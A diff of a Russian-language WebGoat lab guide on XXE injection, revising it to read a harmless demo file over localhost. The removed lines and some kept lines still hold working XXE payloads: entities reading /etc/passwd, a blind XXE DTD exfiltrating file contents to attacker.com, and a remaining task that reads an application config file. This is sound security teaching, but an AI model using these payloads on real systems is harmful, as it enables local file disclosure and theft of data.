@@ -200,23 +200,21 @@ Content-Type: application/xml
 </comment>
 ```
 
-**Шаг 2: Внедрение XXE для чтения /etc/passwd**
+**Шаг 2: Внедрение XXE для чтения контролируемого demo-файла**
 Измените тело запроса:
 ```xml
 <?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///tmp/xxe-demo.txt">]>
 <comment>
   <text>&xxe;</text>
 </comment>
 ```
 
-Отправьте запрос. В ответе должно быть содержимое `/etc/passwd` (или сообщение об ошибке, если файл недоступен в контейнере).
+Отправьте запрос. В ответе должно быть только заранее созданное учебное содержимое demo-файла, например `xxe-demo-marker`. Системные файлы не читаем и не сохраняем как evidence.
 
-**Шаг 3: Чтение других файлов**
-Попробуйте прочитать:
-- `file:///etc/hostname`
-- `file:///proc/version`
-- `file:///var/log/webgoat.log` (если есть)
+**Шаг 3: Что считается запрещенным evidence**
+
+Не читайте и не сохраняйте полные системные файлы, конфиги, логи и секреты. Если лаборатория показывает, что такой доступ теоретически возможен, оформите это как `risk: arbitrary local file read`, а evidence ограничьте redacted marker-строкой.
 
 **Шаг 4: Blind XXE через WebGoat**
 В разделе **Blind XXE** попробуйте атаку, когда результат не возвращается напрямую.
@@ -224,15 +222,15 @@ Content-Type: application/xml
 Пейлоад для Blind XXE с exfiltration:
 ```xml
 <!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "http://attacker.com:4444/xxe.dtd">
+  <!ENTITY % xxe SYSTEM "http://127.0.0.1:4444/xxe.dtd">
   %xxe;
 ]>
 ```
 
 Где `xxe.dtd` содержит:
 ```xml
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com:4444/?data=%file;'>">
+<!ENTITY % file SYSTEM "file:///tmp/xxe-demo.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:4444/?marker=%file;'>">
 %eval;
 %exfil;
 ```
@@ -257,7 +255,7 @@ Host: localhost:8080
 Content-Type: application/xml
 
 <?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///tmp/xxe-demo.txt">]>
 <comment>
   <text>&xxe;</text>
 </comment>
@@ -268,10 +266,7 @@ Content-Type: application/xml
 HTTP/1.1 200 OK
 Content-Type: application/json
 
-{"lessonCompleted": true, "feedback": "root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-..."}
+{"lessonCompleted": true, "feedback": "xxe-demo-marker"}
 ```
 
 **Blind XXE — проверка через локальный сервер:**
@@ -281,14 +276,14 @@ python3 -m http.server 4444
 
 # Логи сервера при Blind XXE:
 127.0.0.1 - - [29/Apr/2026 12:34:56] "GET /xxe.dtd HTTP/1.1" 200 -
-127.0.0.1 - - [29/Apr/2026 12:34:57] "GET /?data=root:x:0:0:root... HTTP/1.1" 200 -
+127.0.0.1 - - [29/Apr/2026 12:34:57] "GET /?marker=xxe-demo-marker HTTP/1.1" 200 -
 ```
 
 ### Частые ошибки
 
 1. **Забыть про DTD** — XXE работает через объявление `<!DOCTYPE`
-2. **Использовать относительные пути** — лучше использовать абсолютные (`file:///etc/passwd`)
-3. **Blind XXE без exfiltration** — нужен внешний сервер для приема данных
+2. **Использовать системные файлы как evidence** — для обучения достаточно контролируемого demo-файла (`file:///tmp/xxe-demo.txt`)
+3. **Blind XXE с внешним сервером** — в базовом пути используйте только `127.0.0.1`; внешние OAST-сервисы только lab-only/approval
 4. **Неправильный Content-Type** — должен быть `application/xml`, а не `application/x-www-form-urlencoded`
 
 ### Вопросы на понимание
@@ -296,15 +291,15 @@ python3 -m http.server 4444
 1. Почему XXE работает только если XML-парсер обрабатывает DTD?
 2. В чем разница между обычным XXE и Blind XXE?
 3. Как защититься от XXE на стороне сервера?
-4. Почему `file:///etc/passwd` работает, а `http://127.0.0.1:8083` может быть заблокирован?
+4. Почему чтение локального файла и запрос к HTTP endpoint контролируются разными настройками парсера и сети?
 
 ### Адаптация под macOS (M2)
 
 ```bash
 # Blind XXE — хостинг DTD файла на macOS (M2)
 cat > /tmp/xxe.dtd << 'EOF'
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:4444/?data=%file;'>">
+<!ENTITY % file SYSTEM "file:///tmp/xxe-demo.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:4444/?marker=%file;'>">
 %eval;
 %exfil;
 EOF
@@ -338,7 +333,7 @@ parser = ET.XMLParser(resolve_entities=False)
 
 ## Задачи для самостоятельного выполнения
 
-1. **Чтение файла в WebGoat**: В разделе **XXE → XXE Injection** выполните чтение файла `/etc/passwd` через XXE. Сделайте скриншот запроса в Burp и ответа сервера. Какие строки из `/etc/passwd` вы увидели?
+1. **Чтение контролируемого файла в WebGoat**: В разделе **XXE → XXE Injection** выполните чтение только demo-файла `/tmp/xxe-demo.txt` или используйте встроенный transcript, если контейнер не позволяет создать файл. Сделайте скриншот запроса в Burp и ответа сервера. В evidence должна быть только marker-строка.
 
 2. **Чтение конфигурационного файла**: Попробуйте прочитать конфигурационный файл приложения через XXE. В Docker-контейнере WebGoat попробуйте пути:
    - `file:///home/webgoat/.webgoat-config.xml`
